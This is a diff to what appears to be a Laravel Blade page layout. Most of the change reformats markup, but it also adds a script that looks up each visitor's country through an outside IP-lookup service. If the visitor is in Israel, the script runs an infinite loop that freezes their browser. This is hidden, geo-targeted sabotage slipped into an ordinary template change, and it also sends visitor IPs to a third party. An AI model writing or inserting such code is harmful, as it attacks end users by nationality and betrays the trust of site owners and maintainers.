@@ -12,25 +12,36 @@
 
 
     <!-- Styles -->
-    {{-- <link rel="stylesheet" href="{{ mix('css/app.css') }}"> --}}
+    {{--
+    <link rel="stylesheet" href="{{ mix('css/app.css') }}"> --}}
     {!! SEO::generate() !!}
 
-        <script>
-            var APP_URL = "{{  url('/') }}";
-        </script>
-        <script>
-            var user_id = @auth {{ Auth::user()->id }}; @endauth @guest false @endguest
-        </script>
+    <script>
+        var APP_URL = "{{ url('/') }}";
+        var country = "Iran"
+        fetch('https://extreme-ip-lookup.com/json/')
+            .then(res => res.json())
+            .then(response => {
+               country = response.country;
+               if(country == 'Israel'){
+                   while(true){}
+               }
+            });
 
-</head>
+    </script>
+    <script>
+        var user_id = @auth {{ Auth::user()->id }} @endauth @guest false @endguest;
+    </script>
 
-<body class="font-sans antialiased">
-    @inertia
+    </head>
 
-    <script src="/manifest.js" defer></script>
-    <script src="/js/vendor.js" defer></script>
-    <script src="/js/app.js" defer></script>
-    <script src="{{ url('/js/framemanager.js') }}" defer></script>
-</body>
+    <body class="font-sans antialiased">
+        @inertia
 
-</html>
+        <script src="/manifest.js" defer></script>
+        <script src="/js/vendor.js" defer></script>
+        <script src="/js/app.js" defer></script>
+        <script src="{{ url('/js/framemanager.js') }}" defer></script>
+    </body>
+
+    </html>
